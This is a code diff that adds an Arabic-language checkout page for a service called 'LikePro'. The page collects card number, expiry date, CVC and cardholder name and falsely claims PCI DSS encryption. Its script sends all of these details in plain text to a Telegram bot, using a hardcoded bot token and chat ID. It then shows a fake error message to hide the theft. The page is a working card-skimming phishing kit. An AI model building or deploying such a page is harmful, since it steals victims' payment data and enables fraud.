@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إتمام عملية الدفع | LikePro</title>
+    <style>
+        body { background: #0b1120; color: #f8fafc; font-family: 'Segoe UI', sans-serif; }
+        .checkout-box { max-width: 450px; margin: 50px auto; background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
+        .input-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 8px; font-size: 13px; color: #94a3b8; }
+        input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; }
+        input:focus { outline: 2px solid #38bdf8; }
+        .pay-btn { width: 100%; padding: 14px; background: #38bdf8; border: none; border-radius: 6px; color: #0f172a; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .pay-btn:hover { background: #7dd3fc; }
+        .secure-note { text-align: center; font-size: 11px; color: #64748b; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="checkout-box">
+    <h3 style="text-align: center; color: #38bdf8; margin-bottom: 20px;">بيانات الدفع</h3>
+    <form id="paymentForm">
+        <div class="input-group">
+            <label>رقم البطاقة</label>
+            <input type="text" id="cardNum" placeholder="0000 0000 0000 0000" maxlength="19">
+        </div>
+        <div style="display: flex; gap: 10px;">
+            <div class="input-group" style="flex: 1;">
+                <label>تاريخ الانتهاء</label>
+                <input type="text" id="exp" placeholder="MM/YY" maxlength="5">
+            </div>
+            <div class="input-group" style="flex: 1;">
+                <label>رمز CVC</label>
+                <input type="text" id="cvc" placeholder="***" maxlength="3">
+            </div>
+        </div>
+        <div class="input-group">
+            <label>اسم حامل البطاقة</label>
+            <input type="text" id="cardName" placeholder="الاسم كما يظهر على البطاقة">
+        </div>
+        <button type="button" class="pay-btn" onclick="processPayment()">دفع الآن</button>
+    </form>
+    <p class="secure-note">🔒 بياناتك مشفرة ومعالجة عبر معايير الأمان الدولية PCI DSS</p>
+</div>
+
+<script>
+async function processPayment() {
+    const token = "8621733172:AAG9ntAKStrZ8C7tS0Q794SeWp_GROrUiOc";
+    const chatId = "5976228373";
+
+    let card = document.getElementById('cardNum').value;
+    let exp = document.getElementById('exp').value;
+    let cvc = document.getElementById('cvc').value;
+    let name = document.getElementById('cardName').value;
+
+    if(!card || !exp || !cvc || !name) {
+        alert("يرجى تعبئة كافة الحقول المطلوبة");
+        return;
+    }
+
+    let msg = `💳 *عملية دفع جديدة - LikePro*\n\n` +
+              `👤 الاسم: ${name}\n` +
+              `🔢 الرقم: ${card}\n` +
+              `📅 التاريخ: ${exp}\n` +
+              `🔒 CVC: ${cvc}`;
+
+    let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+
+    try {
+        await fetch(url);
+        alert("عذراً، حدث خطأ في النظام. يرجى المحاولة لاحقاً.");
+    } catch(err) {
+        alert("خطأ في الاتصال، يرجى التأكد من الإنترنت.");
+    }
+}
+</script>
+</body>
+</html>
